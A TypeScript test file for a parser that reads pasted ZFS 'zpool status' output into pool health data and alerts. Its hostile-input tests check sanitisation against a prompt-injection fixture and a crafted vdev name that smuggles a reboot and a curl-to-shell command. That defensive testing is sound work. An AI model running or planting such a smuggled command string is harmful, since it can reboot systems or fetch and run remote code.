// zpool status paste parser: parsed Snapshot.zfs slice plus the end-to-end
// verdict from the real evaluator with only the zfs allowlist unmuted.
// Fixtures without the synthetic- prefix follow zpool-status(8) / ZFS-8000-*
// layouts with fake serials; synthetic-* ones are constructed edge cases.

import { readFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi, type MockInstance } from "vitest";

import { evaluateAlerts, type AlertResult, type Snapshot } from "$lib/server/alerts/evaluator";
import { listMetadataRuleTypes } from "$lib/server/alerts/fix-workflow/loader";
import { zpoolParser } from "../parsers/zpool";

const FIXTURES = join(__dirname, "fixtures", "zfs");

function fixture(name: string): string {
  return readFileSync(join(FIXTURES, name), "latin1");
}

function evaluate(snapshot: Partial<Snapshot>): AlertResult[] {
  return evaluateAlerts(snapshot as Snapshot, {
    muted_rules: listMetadataRuleTypes().filter((t) => !zpoolParser.rules.includes(t)),
    ipmi_sel_critical_window_days: 3650,
  });
}

function pools(text: string) {
  return zpoolParser.parse(text).snapshot.zfs?.pools ?? [];
}

function summary(alerts: AlertResult[]): string[] {
  return alerts.map((a) => `${a.type}:${a.severity}`).sort();
}

function stringLeaves(v: unknown, out: string[] = []): string[] {
  if (typeof v === "string") out.push(v);
  else if (Array.isArray(v)) for (const x of v) stringLeaves(x, out);
  else if (v && typeof v === "object") for (const x of Object.values(v)) stringLeaves(x, out);
  return out;
}

let errorSpy: MockInstance;
beforeEach(() => {
  errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
});
afterEach(() => {
  // A rule that throws is swallowed by evaluateAlerts and logged here.
  expect(errorSpy).not.toHaveBeenCalled();
  errorSpy.mockRestore();
});

describe("zpoolParser metadata", () => {
  it("allowlists exactly the three zfs rules, all known to the rule registry", () => {
    expect([...zpoolParser.rules].sort()).toEqual(["zfs_pool_unhealthy", "zfs_scrub_errors", "zfs_slog_faulted"]);
    for (const r of zpoolParser.rules) expect(listMetadataRuleTypes()).toContain(r);
  });

  it("lists the scrub age as not determinable from one paste", () => {
    const signals = zpoolParser.notDeterminable.map((n) => n.signal);
    expect(signals).toContain("Time since the last scrub");
    expect(signals).toContain("READ/WRITE/CKSUM error growth");
  });

  it("detects every zpool fixture and rejects garbage, empty and non-string input", () => {
    for (const f of [
      "healthy-rpool-mirror.txt",
      "degraded-raidz2-faulted.txt",
      "degraded-raidz2-spare-resilvering.txt",
      "degraded-mirror-unavail-never-scrubbed.txt",
      "scrub-errors-verbose.txt",
      "status-x-all-healthy.txt",
      "synthetic-slog-cache-special.txt",
      "synthetic-mixed-multipool.txt",
      "synthetic-truncated.txt",
      "synthetic-crlf-degraded-raidz2.txt",
      "synthetic-prompt-suspended.txt",
      "synthetic-injection.txt",
    ]) {
      expect(zpoolParser.detect(fixture(f)), f).toBe(true);
    }
    expect(zpoolParser.detect(fixture("synthetic-garbage.txt"))).toBe(false);
    expect(zpoolParser.detect("")).toBe(false);
    expect(zpoolParser.detect(undefined as unknown as string)).toBe(false);
  });
});

describe("healthy", () => {
  it("healthy-rpool-mirror: 2-way mirror, clean scrub, no finding even though the scrub date is old", () => {
    const r = zpoolParser.parse(fixture("healthy-rpool-mirror.txt"));
    expect(r.domain).toBe("zfs");
    expect(r.formats).toEqual(["zpool_status"]);
    expect(r.subjects).toBe(1);
    expect(r.snapshot).toEqual({
      zfs: {
        pools: [
          {
            name: "rpool",
            state: "ONLINE",
            errors_text: "No known data errors",
            scrub_errors: 0,
            scrub_repaired: "0B",
            vdevs: [{ name: "mirror-0", state: "ONLINE", redundancy_class: "mirror_2way", degraded_disks_count: 0 }],
            slog_vdevs: [],
            l2arc_vdevs: [],
          },
        ],
      },
    });
    // The scrub ran in 2025; with a date the rule would call it stale against
    // Date.now(). The parser never writes last_scrub_date, so nothing fires.
    expect(evaluate(r.snapshot)).toEqual([]);
    expect(r.notes.some((n) => n.message.includes("age was not judged"))).toBe(true);
  });

  it("status-x-all-healthy: recognized, zero pools, info note, never a healthy verdict", () => {
    const r = zpoolParser.parse(fixture("status-x-all-healthy.txt"));
    expect(r.formats).toEqual(["zpool_status"]);
    expect(r.subjects).toBe(0);
    expect(r.snapshot).toEqual({});
    expect(r.notes).toHaveLength(1);
    expect(r.notes[0].level).toBe("info");
    expect(r.notes[0].message).not.toMatch(/healthy/i);
    expect(evaluate(r.snapshot)).toEqual([]);
  });

  it("zpool status -x for one named pool and 'no pools available' parse to zero pools", () => {
    const named = zpoolParser.parse("pool 'tank' is healthy\n");
    expect(named.subjects).toBe(0);
    expect(named.formats).toEqual(["zpool_status"]);
    expect(zpoolParser.detect("pool 'tank' is healthy\n")).toBe(true);
    const none = zpoolParser.parse("no pools available\n");
    expect(none.subjects).toBe(0);
    expect(none.notes.map((n) => n.message).join(" ")).toContain("no pools available");
  });
});

describe("failing", () => {
  it("degraded-raidz2-faulted: raidz2 without a spare is critical; counters noted, not invented into the slice", () => {
    const r = zpoolParser.parse(fixture("degraded-raidz2-faulted.txt"));
    expect(pools(fixture("degraded-raidz2-faulted.txt"))).toEqual([
      {
        name: "tank",
        state: "DEGRADED",
        errors_text: "No known data errors",
        scrub_errors: 0,
        scrub_repaired: "0B",
        vdevs: [{ name: "raidz2-0", state: "DEGRADED", redundancy_class: "raidz2", degraded_disks_count: 1 }],
        slog_vdevs: [],
        l2arc_vdevs: [],
      },
    ]);
    const alerts = evaluate(r.snapshot);
    expect(summary(alerts)).toEqual(["zfs_pool_unhealthy:critical"]);
    expect(alerts[0].evidence).toMatchObject({ vdev_name: "raidz2-0", vdev_redundancy_class: "raidz2", spare_in_progress: false });
    expect(r.notes.find((n) => n.message.includes("nonzero READ, WRITE or CKSUM"))?.message).toMatch(/^1 vdev row/);
  });

  it("degraded-raidz2-spare-resilvering: spare-N with an ONLINE leaf sets spare_in_progress, demoting to warning", () => {
    const r = zpoolParser.parse(fixture("degraded-raidz2-spare-resilvering.txt"));
    const [p] = pools(fixture("degraded-raidz2-spare-resilvering.txt"));
    // The spare-1 slot is the one non-ONLINE member, as the agent counts it.
    expect(p.vdevs).toEqual([{ name: "raidz2-0", state: "DEGRADED", redundancy_class: "raidz2", degraded_disks_count: 1, spare_in_progress: true }]);
    // A resilver hides earlier scrubs: neither "never scrubbed" nor an error count.
    expect(p.scrub_never_run).toBeUndefined();
    expect(p.scrub_errors).toBeUndefined();
    expect(summary(evaluate(r.snapshot))).toEqual(["zfs_pool_unhealthy:warning"]);
    expect(r.notes.some((n) => n.message.includes("most recent scan"))).toBe(true);
  });

  // R3-4: the spare covers one failed member; with a second one down the
  // raidz2 has no parity left until the rebuild finishes. The dashboard
  // demotes only on degraded_disks_count <= 1, which this parser never sent.
  it("a raidz2 resilvering onto a spare with a second failed member stays critical", () => {
    const text = fixture("synthetic-degraded-raidz2-spare-and-second-fault.txt");
    const [p] = pools(text);
    expect(p.vdevs).toEqual([{ name: "raidz2-0", state: "DEGRADED", redundancy_class: "raidz2", degraded_disks_count: 2 }]);
    expect(summary(evaluate(zpoolParser.parse(text).snapshot))).toEqual(["zfs_pool_unhealthy:critical"]);
  });

  it("does not demote a raidz2 whose spare slot was cut off before its count is known", () => {
    const text = fixture("degraded-raidz2-spare-resilvering.txt").split("\n").slice(0, 17).join("\n");
    const [p] = pools(text);
    expect(p.vdevs).toEqual([{ name: "raidz2-0", state: "DEGRADED", redundancy_class: "raidz2" }]);
    expect(summary(evaluate(zpoolParser.parse(text).snapshot))).toEqual(["zfs_pool_unhealthy:critical"]);
  });

  it("degraded-mirror-unavail-never-scrubbed: 2-way mirror is critical and 'none requested' is the never-scrubbed info", () => {
    const r = zpoolParser.parse(fixture("degraded-mirror-unavail-never-scrubbed.txt"));
    expect(pools(fixture("degraded-mirror-unavail-never-scrubbed.txt"))).toEqual([
      {
        name: "data",
        state: "DEGRADED",
        errors_text: "No known data errors",
        scrub_never_run: true,
        vdevs: [{ name: "mirror-0", state: "DEGRADED", redundancy_class: "mirror_2way", degraded_disks_count: 1 }],
        slog_vdevs: [],
        l2arc_vdevs: [],
      },
    ]);
    expect(summary(evaluate(r.snapshot))).toEqual(["zfs_pool_unhealthy:critical", "zfs_scrub_errors:info"]);
  });

  it("scrub-errors-verbose: scrub errors fire, the -v file list is counted not copied", () => {
    const r = zpoolParser.parse(fixture("scrub-errors-verbose.txt"));
    const [p] = pools(fixture("scrub-errors-verbose.txt"));
    expect(p).toEqual({
      name: "tank",
      state: "ONLINE",
      errors_text: "Permanent errors have been detected in 2 file(s)",
      scrub_errors: 2,
      scrub_repaired: "0B",
      vdevs: [
        { name: "sda", state: "ONLINE", redundancy_class: "stripe", degraded_disks_count: 0 },
        { name: "sdb", state: "ONLINE", redundancy_class: "stripe", degraded_disks_count: 0 },
      ],
      slog_vdevs: [],
      l2arc_vdevs: [],
    });
    const alerts = evaluate(r.snapshot);
    expect(summary(alerts)).toEqual(["zfs_scrub_errors:warning"]);
    expect(alerts[0].evidence).toMatchObject({ pool: "tank", scrub_errors: 2, scrub_repaired: "0B" });
    expect(JSON.stringify(r)).not.toContain("vm-101-disk-0");
    expect(r.notes.some((n) => n.message.includes("report data errors"))).toBe(true);
  });

  it("a -v error entry for a pool named 'pool' (pool:<0x1>) is a file, not a new pool block", () => {
    const text = [
      "  pool: pool",
      " state: ONLINE",
      "  scan: scrub repaired 0B in 00:00:09 with 1 errors on Sun Sep 14 00:24:10 2025",
      "config:",
      "",
      "\tNAME        STATE     READ WRITE CKSUM",
      "\tpool        ONLINE       0     0     0",
      "\t  sda       ONLINE       0     0     2",
      "",
      "errors: Permanent errors have been detected in the following files:",
      "",
      "        pool:<0x1>",
      "        /pool/data/file.bin",
      "",
      "  pool: second",
      " state: ONLINE",
    ].join("\n");
    const r = zpoolParser.parse(text);
    expect(pools(text).map((p) => [p.name, p.errors_text])).toEqual([
      ["pool", "Permanent errors have been detected in 2 file(s)"],
      ["second", ""],
    ]);
    expect(r.notes.some((n) => n.message.includes("were skipped"))).toBe(false);
  });

  it("synthetic-slog-cache-special: SLOG fault and L2ARC loss route to their own rules; special/dedup count as data vdevs", () => {
    const r = zpoolParser.parse(fixture("synthetic-slog-cache-special.txt"));
    const [p] = pools(fixture("synthetic-slog-cache-special.txt"));
    expect(p.vdevs).toEqual([
      { name: "mirror-0", state: "ONLINE", redundancy_class: "mirror_2way", degraded_disks_count: 0 },
      { name: "mirror-1", state: "ONLINE", redundancy_class: "mirror_2way", degraded_disks_count: 0 },
      { name: "mirror-2", state: "ONLINE", redundancy_class: "mirror_2way", degraded_disks_count: 0 },
    ]);
    expect(p.slog_vdevs).toEqual([{ name: "nvme-FAKE_NVME_SLOG_A-part1", state: "FAULTED" }]);
    expect(p.l2arc_vdevs).toEqual([{ name: "nvme-FAKE_NVME_L2ARC_A-part2", state: "UNAVAIL" }]);
    const alerts = evaluate(r.snapshot);
    expect(summary(alerts)).toEqual(["zfs_pool_unhealthy:info", "zfs_slog_faulted:critical"]);
    expect(alerts.find((a) => a.type === "zfs_pool_unhealthy")?.evidence.scope).toBe("l2arc");
    expect(r.notes.some((n) => n.message.includes("hot spare"))).toBe(true);
  });

  it("synthetic-prompt-suspended: prompt lines ignored, space-expanded tree read, SUSPENDED is one critical", () => {
    const r = zpoolParser.parse(fixture("synthetic-prompt-suspended.txt"));
    expect(r.subjects).toBe(1);
    expect(pools(fixture("synthetic-prompt-suspended.txt"))).toEqual([
      {
        name: "backup",
        state: "SUSPENDED",
        errors_text: "List of errors unavailable",
        scrub_errors: 0,
        scrub_repaired: "0B",
        vdevs: [{ name: "usb-WD_Elements_25A3_FAKE0001-0:0", state: "FAULTED", redundancy_class: "stripe", degraded_disks_count: 0 }],
        slog_vdevs: [],
        l2arc_vdevs: [],
      },
    ]);
    const alerts = evaluate(r.snapshot);
    expect(summary(alerts)).toEqual(["zfs_pool_unhealthy:critical"]);
    expect(alerts[0].evidence.severity_reason).toBe("pool I/O suspended");
  });
});

describe("mixed, partial, CRLF", () => {
  it("synthetic-mixed-multipool: five pools, each judged on its own redundancy class", () => {
    const text = fixture("synthetic-mixed-multipool.txt");
    const r = zpoolParser.parse(text);
    expect(r.subjects).toBe(5);
    const byName = Object.fromEntries(pools(text).map((p) => [p.name, p]));
    expect(Object.keys(byName)).toEqual(["rpool", "tank", "backup", "bulk", "scratch"]);
    expect(byName.tank.vdevs).toEqual([{ name: "raidz1-0", state: "DEGRADED", redundancy_class: "raidz1", degraded_disks_count: 1 }]);
    expect(byName.backup.vdevs).toEqual([{ name: "mirror-0", state: "DEGRADED", redundancy_class: "mirror_3way", degraded_disks_count: 1 }]);
    expect(byName.bulk.vdevs).toEqual([{ name: "draid2:4d:7c:1s-0", state: "DEGRADED", redundancy_class: "draid", degraded_disks_count: 1 }]);
    // OpenZFS 2.2+ prints no scan line for a never-scanned pool.
    expect(byName.scratch.scrub_never_run).toBe(true);
    expect(byName.rpool.scrub_never_run).toBeUndefined();

    const alerts = evaluate(r.snapshot);
    expect(summary(alerts)).toEqual([
      "zfs_pool_unhealthy:critical",
      "zfs_pool_unhealthy:critical",
      "zfs_pool_unhealthy:warning",
      "zfs_scrub_errors:info",
    ]);
    const pool = (name: string) => alerts.filter((a) => a.evidence.pool === name).map((a) => `${a.type}:${a.severity}`);
    expect(pool("tank")).toEqual(["zfs_pool_unhealthy:critical"]);
    expect(pool("backup")).toEqual(["zfs_pool_unhealthy:warning"]);
    expect(pool("bulk")).toEqual(["zfs_pool_unhealthy:critical"]);
    expect(pool("scratch")).toEqual(["zfs_scrub_errors:info"]);
    expect(pool("rpool")).toEqual([]);
  });

  it("synthetic-truncated: the cut-off mirror keeps an unknown width and no errors_text is invented", () => {
    const text = fixture("synthetic-truncated.txt");
    const r = zpoolParser.parse(text);
    expect(r.subjects).toBe(2);
    const [, data] = pools(text);
    expect(data).toEqual({
      name: "data",
      state: "DEGRADED",
      errors_text: "",
      scrub_never_run: true,
      vdevs: [
        { name: "mirror-0", state: "ONLINE", redundancy_class: "mirror_2way", degraded_disks_count: 0 },
        { name: "mirror-1", state: "DEGRADED", redundancy_class: "mirror" },
      ],
      slog_vdevs: [],
      l2arc_vdevs: [],
    });
    const alerts = evaluate(r.snapshot);
    expect(summary(alerts)).toEqual(["zfs_pool_unhealthy:critical", "zfs_scrub_errors:info"]);
    expect(alerts.find((a) => a.type === "zfs_pool_unhealthy")?.evidence.vdev_redundancy_class).toBe("mirror");
    expect(r.notes.some((n) => n.level === "warning" && n.message.includes("cut off"))).toBe(true);
  });

  it("a cut-off block whose degraded vdev is missing falls back to the pool state", () => {
    const text = [
      "  pool: tank",
      " state: DEGRADED",
      "config:",
      "",
      "\tNAME        STATE     READ WRITE CKSUM",
      "\ttank        DEGRADED     0     0     0",
      "\t  mirror-0  ONLINE       0     0     0",
      "\t    sda     ONLINE       0     0     0",
    ].join("\n");
    const [p] = pools(text);
    expect(p.vdevs).toBeUndefined();
    expect(p.scrub_never_run).toBeUndefined();
    const alerts = evaluate({ zfs: { pools: [p] } });
    expect(summary(alerts)).toEqual(["zfs_pool_unhealthy:warning"]);
    expect(alerts[0].evidence.scope).toBe("pool_legacy");
  });

  it("a paste that starts at the NAME header still yields a pool, with no scrub claim", () => {
    const text = [
      "\tNAME        STATE     READ WRITE CKSUM",
      "\ttank        DEGRADED     0     0     0",
      "\t  mirror-0  DEGRADED     0     0     0",
      "\t    sda     ONLINE       0     0     0",
      "\t    sdb     REMOVED      0     0     0",
      "",
      "errors: No known data errors",
    ].join("\n");
    expect(zpoolParser.detect(text)).toBe(true);
    expect(pools(text)).toEqual([
      {
        name: "tank",
        state: "DEGRADED",
        errors_text: "No known data errors",
        vdevs: [{ name: "mirror-0", state: "DEGRADED", redundancy_class: "mirror_2way", degraded_disks_count: 1 }],
        slog_vdevs: [],
        l2arc_vdevs: [],
      },
    ]);
  });

  it("lost indentation: per-vdev data is dropped and the pool state is judged", () => {
    const text = fixture("degraded-raidz2-faulted.txt").replace(/^[ \t]+/gm, "");
    const r = zpoolParser.parse(text);
    const [p] = pools(text);
    expect(p.vdevs).toBeUndefined();
    expect(p.slog_vdevs).toBeUndefined();
    expect(summary(evaluate(r.snapshot))).toEqual(["zfs_pool_unhealthy:warning"]);
    expect(r.notes.some((n) => n.message.includes("indentation was lost"))).toBe(true);
  });

  it("synthetic-crlf-degraded-raidz2: CRLF parses identically to LF", () => {
    const crlf = fixture("synthetic-crlf-degraded-raidz2.txt");
    expect(crlf).toContain("\r\n");
    const lf = zpoolParser.parse(fixture("degraded-raidz2-faulted.txt"));
    const r = zpoolParser.parse(crlf);
    expect(r).toEqual(lf);
    expect(summary(evaluate(r.snapshot))).toEqual(["zfs_pool_unhealthy:critical"]);
  });
});

describe("scan line variants", () => {
  function scanPool(scan: string | null) {
    const lines = ["  pool: tank", " state: ONLINE"];
    if (scan !== null) lines.push(`  scan: ${scan}`);
    lines.push("config:", "", "\tNAME        STATE     READ WRITE CKSUM", "\ttank        ONLINE       0     0     0", "\t  sda       ONLINE       0     0     0", "", "errors: No known data errors");
    return pools(lines.join("\n"))[0];
  }

  it("reads repaired/errors from current and 0.7-era formats", () => {
    expect(scanPool("scrub repaired 1.20M in 01:02:03 with 5 errors on Sun Sep 14 01:26:04 2025")).toMatchObject({ scrub_repaired: "1.20M", scrub_errors: 5 });
    expect(scanPool("scrub repaired 0 in 0h12m with 0 errors on Sun Jul  2 00:36:01 2017")).toMatchObject({ scrub_repaired: "0", scrub_errors: 0 });
  });

  it("in-progress, paused, canceled and resilver lines make no error count and no never-scrubbed claim", () => {
    for (const scan of [
      "scrub in progress since Sun Sep 14 00:24:01 2025",
      "scrub paused since Sun Sep 14 02:00:00 2025",
      "scrub canceled on Sun Sep 14 00:30:00 2025",
      "resilvered 2.13G in 00:01:05 with 0 errors on Mon Sep 15 18:22:31 2025",
    ]) {
      const p = scanPool(scan);
      expect(p.scrub_errors, scan).toBeUndefined();
      expect(p.scrub_never_run, scan).toBeUndefined();
    }
  });

  it("'none requested' and a missing scan line both mean never scrubbed", () => {
    expect(scanPool("none requested").scrub_never_run).toBe(true);
    expect(scanPool(null).scrub_never_run).toBe(true);
  });

  it("never writes last_scrub_date", () => {
    const all = [
      "healthy-rpool-mirror.txt",
      "synthetic-mixed-multipool.txt",
      "scrub-errors-verbose.txt",
    ].flatMap((f) => pools(fixture(f)));
    for (const p of all) expect(p).not.toHaveProperty("last_scrub_date");
  });
});

describe("hostile input", () => {
  it("synthetic-garbage: no throw, zero subjects, no formats, empty slice", () => {
    const r = zpoolParser.parse(fixture("synthetic-garbage.txt"));
    expect(r).toMatchObject({ domain: "zfs", formats: [], subjects: 0, snapshot: {} });
    expect(r.notes).toHaveLength(1);
    expect(evaluate(r.snapshot)).toEqual([]);
    for (const junk of ["", "\n\n", "pool:\nstate:\nconfig:\n\tNAME STATE", "  pool: tank\n state: banana\n"]) {
      expect(() => zpoolParser.parse(junk)).not.toThrow();
      expect(zpoolParser.parse(junk).subjects).toBe(0);
    }
    expect(() => zpoolParser.parse(undefined as unknown as string)).not.toThrow();
  });

  it("synthetic-injection: the sentence never reaches the slice, notes or alert text", () => {
    const r = zpoolParser.parse(fixture("synthetic-injection.txt"));
    expect(pools(fixture("synthetic-injection.txt"))).toEqual([
      {
        name: "tank",
        state: "DEGRADED",
        errors_text: "No known data errors",
        scrub_errors: 3,
        scrub_repaired: "0B",
        vdevs: [{ name: "mirror-0", state: "DEGRADED", redundancy_class: "mirror_2way", degraded_disks_count: 1 }],
        slog_vdevs: [],
        l2arc_vdevs: [],
      },
    ]);
    const IDENT = /^[A-Za-z0-9._:/#()+-]*$/;
    const CONSTANTS = new Set(["No known data errors"]);
    for (const s of stringLeaves(r.snapshot)) {
      expect(s.length).toBeLessThanOrEqual(64);
      expect(IDENT.test(s) || CONSTANTS.has(s), s).toBe(true);
    }
    for (const n of r.notes) expect(n.message).not.toMatch(/ignore|instruction|assistant/i);

    const alerts = evaluate(r.snapshot);
    expect(summary(alerts)).toEqual(["zfs_pool_unhealthy:critical", "zfs_scrub_errors:warning"]);
    expect(JSON.stringify(alerts)).not.toMatch(/ignore|instruction|assistant/i);
  });

  it("an injection-shaped vdev name is reduced to an identifier, never a sentence", () => {
    const text = [
      "  pool: tank",
      " state: DEGRADED",
      "config:",
      "",
      "\tNAME                    STATE     READ WRITE CKSUM",
      "\ttank                    DEGRADED     0     0     0",
      "\t  `reboot`;curl$IFS'x'|sh  FAULTED      0     0     0",
      "",
      "errors: No known data errors",
    ].join("\n");
    const [p] = pools(text);
    expect(p.vdevs).toEqual([{ name: "rebootcurlIFSxsh", state: "FAULTED", redundancy_class: "stripe", degraded_disks_count: 0 }]);
    const alerts = evaluate({ zfs: { pools: [p] } });
    // No scan line in a complete block: also the never-scrubbed info.
    expect(summary(alerts)).toEqual(["zfs_pool_unhealthy:critical", "zfs_scrub_errors:info"]);
    // Fields that interpolate the paste carry no shell metacharacters (the
    // rule's own recommendation uses backticks and its reasons use ";").
    for (const a of alerts) expect(`${a.title} ${JSON.stringify(a.evidence)}`).not.toMatch(/[`$|']/);
  });
});

// R2-8: a DEGRADED log mirror leaves the pool DEGRADED, but zfs_pool_unhealthy
// reads data vdevs and zfs_slog_faulted fires only on a FAULTED, REMOVED or
// UNAVAIL log top, so nothing fired and nothing said why.
describe("degraded log (SLOG) mirror", () => {
  const text = fixture("synthetic-slog-mirror-degraded.txt");

  it("raises no finding but says the log mirror is degraded and that no rule judges it", () => {
    const r = zpoolParser.parse(text);
    expect(pools(text)[0]).toMatchObject({
      name: "fast",
      state: "DEGRADED",
      slog_vdevs: [{ name: "mirror-1", state: "DEGRADED" }],
      vdevs: [{ name: "raidz2-0", state: "ONLINE", redundancy_class: "raidz2" }],
    });
    expect(summary(evaluate(r.snapshot))).toEqual([]);
    expect(r.notes).toContainEqual({
      level: "warning",
      message: "1 log (SLOG) vdev(s) are DEGRADED or OFFLINE. No Glassmkr rule judges a degraded log mirror; zfs_slog_faulted fires only when the log vdev itself is FAULTED, REMOVED or UNAVAIL.",
    });
    // The tree does explain the pool state, so the pool-level fallback note stays out.
    expect(r.notes.some((n) => /no vdev row in this output explains it/.test(n.message))).toBe(false);
  });

  it("a FAULTED log vdev still fires zfs_slog_faulted and gets no degraded-mirror note", () => {
    const faulted = text.replace("mirror-1     DEGRADED", "mirror-1     FAULTED ");
    const r = zpoolParser.parse(faulted);
    expect(summary(evaluate(r.snapshot))).toEqual(["zfs_slog_faulted:critical"]);
    expect(r.notes.some((n) => /log \(SLOG\) vdev/.test(n.message))).toBe(false);
  });
});
